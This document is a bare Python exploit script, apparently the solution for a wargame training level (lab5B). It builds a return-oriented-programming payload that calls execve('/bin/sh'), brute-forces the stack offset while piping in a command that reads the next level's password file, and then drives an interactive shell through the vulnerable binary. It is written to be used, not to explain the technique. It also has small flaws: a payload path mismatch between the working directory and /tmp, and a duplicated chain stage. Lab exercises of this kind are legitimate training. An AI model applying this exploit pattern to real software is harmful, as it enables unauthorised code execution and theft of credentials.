import struct,os
def write_payload(offset=0):
        padding=b"/bin/sh"+b"\x00"
        padding+=b"A"*(140-len(padding))
        addr_of_binsh=struct.pack("<I",0xbffff680-offset)
        stage1=struct.pack("<I",0x80e4c56)#pop eax;ret
        stage1+=b"\x0b\x00\x00\x00"
        stage2=struct.pack("<I",0x80e55ad)#pop ecx;ret
        stage2+=b"\x00\x00\x00\x00"
        stage3=struct.pack("<I",0x80817f6)#pop edx;ret
        stage3+=b"\x00\x00\x00\x00"
        stage4=struct.pack("<I",0x80481c9)#pop ebx;ret
        stage4+=addr_of_binsh
        stage5=struct.pack("<I",0x806f320)#int 0x80
        payload=padding+stage1+stage2+stage2+stage3+stage4+stage5
        f=open("5B_payload","wb")
        f.write(payload+b"\n")
        f.close()
def get_offset():
        offset=0
        while True:
                write_payload(offset)
                out=os.popen("(cat /tmp/5B_payload;echo 'cat /home/lab5A/.pass') | /levels/lab05/lab5B")
                if out.read()!='' :
                        print("Offset=",offset)
                        return offset
                os.system("rm -f /tmp/5B_payload")
                offset+=1
def shell():
        write_payload(get_offset())
        while True:
                cmd=input("$ ")
                print(os.popen("(cat /tmp/5B_payload;echo '{}') | /levels/lab05/lab5B".format(cmd)).read())
                if cmd=='exit':
                        os.system("rm -f /tmp/5B_payload")
                        return 0
shell()
